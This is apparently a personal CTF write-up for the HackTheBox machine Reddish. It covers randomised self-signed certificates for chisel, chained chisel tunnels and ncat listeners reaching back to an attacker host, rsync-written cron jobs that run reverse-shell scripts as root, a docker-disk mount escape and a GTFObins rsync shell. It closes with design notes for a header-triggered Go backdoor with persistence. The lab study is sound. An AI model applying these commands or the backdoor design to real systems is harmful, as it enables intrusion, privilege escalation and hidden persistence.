I will keep both sets of the commands for my own triumphant learning curvage, for demonstration and for easy of expansion. [Inspired by Techshoolguru Ariticle](https://dev.to/techschoolguru/how-to-create-sign-ssl-tls-certificates-2aai)

By default chisel uses the CA from the host making it OPSEC unsafe so:
- Make a self-signed TLS - no interactive other than copy and paste passphrase just pure cli 
-  Notes: fields are not checked so can just put anything: Scripting this for more randomised certs 
```bash
#!/bin/bash

passphrase=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
echo -n $passphrase > passphrase.out
# Because I need to learn how to suppy user prompt input during a command
echo ""
echo "Passphrase generation:"
echo "$passphrase"
echo ""
echo "Just cat passphrase.out for easy copy and paste"
echo ""
echo ""
touch server-ext.cnf

# Dry-Run with: `-nodes` flag in creating CAm server private key

# CA
# Mitigation of this is filter by entropy of any field and drop
# Ideally this would be tunneled through another 'legitimate' looking protocols, bouncing in and out of the internal network to the internet
# Meering adds an extra level of jibbish to avoid human interaction on cert creation
# /C=$country
country=$(tr -dc 'A-Za-z' </dev/urandom | head -c 2 | xargs -n 1 | tr -d '\n' | tr -d "[:space:]")
# /ST=$state_or_province
state_or_province=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
# /L=$city
city=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
# /O=$organisation
organisation=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
# /OU=$organisational_unit
organisational_unit=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
# /CN=$domain_name
domain_name=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")
# /emailAddress=$orgemail
org_email=$(tr -dc 'A-Za-z0-9!"#$%&'\''()*+,-./:;<=>?@[\]^_`{|}~' </dev/urandom | head -c 24 | sha256sum | sed 's/ -//g' | tr -d '\n' | tr -d "[:space:]")

# Create CA's private key and certificate
openssl req -x509 -newkey rsa:4096 -days 365 -keyout ca-key.pem -out ca-cert.pem -subj "/C=$country/ST=$state_or_province/L=$city/O=$organisation/OU=$organisational_unit/CN=$domain_name/emailAddress=$org_email"

# Server Private Key
openssl req -newkey rsa:4096 -keyout server-key.pem -out server-req.pem -subj "/C=$country/ST=$state_or_province/L=$City/O=$organisation/OU=$organisational_unit/CN=$domain_name/emailAddress=$org_email"

# Sign the server's certificate request
# -CAcreateserial - for ID per certificate it will sign
# -days default is 30 days
# -extfile for x509 confif file
openssl x509 -req -in server-req.pem  -CA ca-cert.pem -CAkey ca-key.pem -CAcreateserial -out server-cert.pem -extfile server-ext.cnf

# Output cert
echo ""
echo "CA's self-signed certificate"
openssl x509 -in ca-cert.pem -noout -text
# Provide certification verification  help
echo ""
echo "Verify certificate:"
echo "openssl verify -CAfile ca-cert.pem server-cert.pem"
echo ""
echo "Your Passphrase is:"
echo "$passphrase"
echo "For further usage just cat passphrase.out for easy copy and paste"
echo ""
exit
```

Unfortunately custom tls is not implemented and I do not have the time to fork and implement fully.  
1. Does not actually parse flags 
2. Does not actually do anything but create a default seeding for keys.
```go
//generate private key (optionally using seed)
key, err := ccrypto.GenerateKey(c.KeySeed)
if err != nil {
	log.Fatal("Failed to generate key")
}

//convert into ssh.PrivateKey
private, err := ssh.ParsePrivateKey(key)
if err != nil {
	log.Fatal("Failed to parse key")
}
```

Two hours of TLS and bash, chisel source code later I feel like I need to justify this to myself at this point:
1. I made a script that is future use proofed for other tasks related to  tls
2. I learnt about CA management
3. Bash random strings and cli cryptography

Considering VPN ip continous changes I added to all new  `*-CMD-by-CMDs.md`
```bash
sed -i 's/$oldip/$newip/g' *-CMD-by-CMDs.md
```

Also upgraded data colleciton options for network sweeping and port scanning - [[Reddish-Notes]]. Then upgraded my mkCTFdir script and [[Reddish-Notes]] again.

I then released after all that I needed `--key`! Never again..

Moving forward with [0xdf](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#rsync-access) rsync has read and write access as it needs to write a backup and read it toop check validity of execution. Therefore it because the script indicate where it is backing up to - aka it is the endpoint we can also control as the root user 
![](rsyncisprived.png)

Before doing the cron that 0xdf does I want to go full manual with the manpage and understood rsync cant read the file system like I hoped and continued on

Because we are cool create another two-rs named cron-esc and change the port number for the following backed-up cron. Without watching the Ippsec video:
```bash
# First start s listener on your host
rlwrap ncat -lvnp 10007
# Then on the www machine as Root
# Create a tunnel with chisel back to NodeRed client
# this did not work
# nohup ./chisel client 10.10.14.24:10000 R:127.0.0.1:10007:172.19.0.4:10007 &
# Node Red - Know I could just kill jobs
nohup ./chisel client 10.10.14.24:10000 10008:127.0.0.1:10008 &
# Www as root
nohup ./chisel client 10.10.14.24:10000 R:127.0.0.1:10008:172.19.0.4:10008 &

chmod +x * /tmp/* 
cp two-rs cron-esc.s
# - First attempt
sed -i 's/172.19.0.4/172.19.0.3/g' cron-esc.sh
sed -i 's/10006/10007/g' cron-esc.sh
# - Second attempt
sed -i 's/172.19.0.3/172.20.0.3/g' cron-esc.sh
sed -i 's/10007/10008/g' cron-esc.sh
rsync -a cron-esc.sh rsync://backup:873/src/tmp/
echo '* * * * * root sh /tmp/cron-esc.sh' > shell
rsync -a shell rsync://backup:873/src/etc/cron.d/


rsync rsync://backup:873/src/tmp/
rsync rsync://backup:873/src/etc/cron.d/

```

Checked [Ippsec Video](https://www.youtube.com/watch?v=Yp4oxoQIBAM&t=3615s) after both attempts failed.

I only had one thing wrong! - I thought that the endpoint would always be the server but with the chain of tunnels it can be the client
```bash
kali -> nodered  -> www  -> backup
# kali 
rlwrap ncat -lvnp 10007 
# nodered = 10000 because the kali serveris 10000 
chisel client kali:10000 10007:127.0.0.1:10000 
# www - 10007 
chisel client noderedIP:10007 10007:127.0.0.1:10007
``` 

Wow
![](insidethebackup.png)


Check for docker container is running `--privileged`, meaning we are can mount to these disks as containerr does not need disks 
```bash
ls /dev/ | grep sda
mount /dev/sdaX /mnt
# For me it was sda2
```

![](wearerunningwithdockermisconfiguration.png)

Because OSCP and the like require root on the book we can then do another chisel chain of pwnage. Again this time no Ippsec; I tried:
```bash
# Kali
rlwrap ncat -lvnp 10008
# NodeRed
nohup ./chisel client 10.10.14.24:10000 10008:127.0.0.1:10000 &
# www - Root shell to open 10008 on kali
nohup ./chisel client 172.19.0.4:10008 10008:127.0.0.1:10008 &
# Connect back www 
nohup ./chisel client 172.20.0.3:10008 10008:127.0.0.1:10008 &
# WE already have cron-esc.sh so
cp cron-esc.sh bigroot.sh
sed -i 's/cron-esc/bigroot/g' shell
sed -i 's/172.20.0.3/172.20.0.2/g' bigroot.sh
sed -i 's/10007/10008/g' bigroot.sh
cp bigroot.sh /mnt/tmp/
cp /etc/cron.d/shell /mnt/etc/cron.d/
```

The box is actually externally facing! so no chisel is actually required - went full chisel and not thinking that are on the host that has to be externally facing and we do not need to go through the virtualised network 
![](rootroot.png)

Finally a map of Reddish
![1080](Reddish-ImprovedThinking)


## Beyond Root

####  RSync and Xargs ...its a Long time coming

Priming my brain with some Dual-media - video first and then manual second:
[Rsync - Jay LaCroix](https://www.youtube.com/watch?v=GqSxR93xK6E), [Rsync Man](https://linux.die.net/man/1/rsync)
```bash
df -h # Check the volumes
lost+found # directory for rsync 
# Check if it could send data with dry run
rsync --dry-run $flags $source $destination 
# -n same as --dry-run
# -a archive mode
# -v verbose
# -z compress
rsync -avz /source $user@$IP:/destination
# -4 -6 for prefer IPv4 or IPv6
# -u skipp newer file on destination!
# -r recurse into directories
# -d no recursive


# GTFObins - shell, suid and sudo :)
$sudo rsync -e sh -c "sh $revshell" # suid: "sh -p"
```
[gtfobins rsync](https://gtfobins.github.io/gtfobins/rsync/#shell)

[Xargs DistroTube](https://www.youtube.com/watch?v=rp7jLi_kgPg) - take stdin as parametres for commands safely for application that do not by default allow stdin as args. 
```bash
# ls, mv, echo - all cant take stdin
# cmd1 | xargs cmd2
# 1 - 5 all on one line - both do the same as xargs default to echo
seq 5 | xargs
seq 5 | xargs echo 
# -t get output with cmd and output in two lines
seq 5 | xargs -t 
# Specify arguments -I [pattern] like {} below:
# file.txt contains hostnames: "htb thm ospg" - no space with each hostname on newline   
cat file.txt | xargs -I {} touch {}.txt 
# Rename each file a jpg instead
ls | cut -d. f1 | xargs -I {} mv {}.txt {}.jpg
# Specify a max number of arguments per line
ls | xargs -n 3
# Maximum number a procs at a time
ls | xargs -n 1 -P 2 bash -c 'echo $0; sleep 1'  

# Find and Xargs and grep all configuration files
find . -type f -name "*.*onf*" | xargs grep -ie 'passw'
```
[Inspiration for the Find,Xargs,grep example](https://phoenixnap.com/kb/xargs-command)


#### Omni-Tooling - Port Redirection and Pivoting through a network
https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
- sshhuTTLe - read into this but inital issues are python and installation method so...
- ssh
	- 0xDF instuction 2.  Copy an ssh client to nodered, and ssh back into my kali box with a reverse tunnel.


Back to Reddish
- `meterpreter portfwd` with  0xDF instructions:
1.  Get a meterpreter session with nodered, and use the `portfwd` capability to tunnel from my local box into the network (like ssh tunneling).


We do not have access to some parts of this box
[0xdf uses SOCAT](https://0xdf.gitlab.io/2019/01/26/htb-reddish.html#www--redis-containers) 

I played around with `meterpreter` and lost interest. Also I want write make changes to ninjashell and go full cyber

#### Use Node RED to understand Virtual networking 

https://nodered.org/docs/user-guide/

Highest possible goal: Build a listening interface (likely web) with NodeRed, and use that to tunnel or  proxy

![1080](easyhttp.png)

[How to build a tcp proxy](https://robertheaton.com/2018/08/31/how-to-build-a-tcp-proxy-1/)

Add videos to helpthroughs seem like a destructive waste of time and potential retroactively added them is only good rerun boxes.

#### Go HTTPS server + BackdoorShell = Easy Way Back In

Would it not just be nice to have chisel that has a shell or a webserver that has a shell.
This is very similar to a [[BeyondRoot-Todo]] C2 so I decide
```go

// Hide in Plain WebApp - redirect to actual Webserver  

// Hide inandthrough  - symlink - rk controlled directory - backup 
// --custom-backup-loc  

// Persistence scripts to load as modules 
// default persistence - Linux - chattr etc

// --persistence  

// If Header X (Key) , Agent Y (Almost legitimate Agent string) , Header Z (Cmd:A |Shell:B )  Do -> Open Backdoor and respond with fingerprint for ssl-age 
// Header U: upload binary to server and execute - putty.exe, etc

// Open Backdoor 
// process .exe
// proc gnuintegrity
```

#### Mad Idea 2 - Flow: One to take control of all network routes from inside a network  

How?
```
```